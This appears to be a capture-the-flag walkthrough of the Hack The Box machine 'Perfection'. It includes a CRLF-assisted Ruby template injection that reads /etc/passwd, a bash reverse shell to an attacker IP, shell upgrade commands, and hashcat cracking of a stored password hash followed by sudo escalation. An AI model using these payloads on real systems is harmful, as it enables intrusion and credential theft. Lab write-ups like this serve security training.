# [Perfection](https://app.hackthebox.com/machines/perfection)

```bash
nmap -p-  --min-rate 5000 10.10.11.253 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan for these ports.

```bash
nmap -A -sC -sV -p22,80 10.10.11.253 -Pn
```

![alt text](img/image-1.png)


After browsing web application, I can see such web page.

![alt text](img/image-2.png)


Let's enumerate this web application. So that, while we saw HTTP response headers, we can get enumeration about web application.

![alt text](img/image-3.png)

We know that `WEBrick/1.7.0` is used and `Ruby/3.0.2` is programming language.


Let's enumerate calculator via fuzzing values.

![alt text](img/image-4.png)


Let's enter data for `category` fields. So that, I just do `CRLF` injection by adding `%0A` character means `New Line`.

![alt text](img/image-5.png)

As this application is programmed in `Ruby` language, let's test `Ruby` SSTI(Server-Side Template Injection) payloads.

![alt text](img/image-6.png)


**Note:** But we need to enter payload as `URL` encoded.
```bash
<%= 7*7 %>
```

![alt text](img/image-7.png)


As this `SSTI` payload worked, let's try other command execution.
```bash
<%= `cat /etc/passwd` %>
```

![alt text](img/image-8.png)


Now, it's time for reverse shell payload.
```bash
<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'` %>
```

![alt text](img/image-9.png)


Now, we enter `URL` encoded payload.

![alt text](img/image-10.png)


Hola! I got reverse shell from port `1337`.

![alt text](img/image-11.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-12.png)


user.txt

![alt text](img/image-13.png)


While I run `id` command, I see that `susan` user belongs to `sudo` group but we don't know his password.


After enumeration of machine, I find `pupilpath_credentials.db` file on `Migration` directory. Let's read this via `sqlite3`.

![alt text](img/image-14.png)


Maybe this hash belongs to password of system user `susan`.

Again, I make enumeration and look at `/var/mail/susan` file which contains sensitive information about password cracking via correct algorithm.

![alt text](img/image-15.png)


So, that's why we need to find correct number which located between 1 and 1 million.


We learn hash type via `hash-identifier` tool.

![alt text](img/image-16.png)


Let's take this hash and crack via `hashcat` via below syntax.

```bash
hashcat -m 1400 -a 3 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d
```

![alt text](img/image-17.png)


susan: susan_nasus_413759210


I just run `sudo -l` and see that `(ALL: ALL) ALL`, that's why I just do `sudo -s` and gain root privilege.


root.txt

![alt text](img/image-18.png)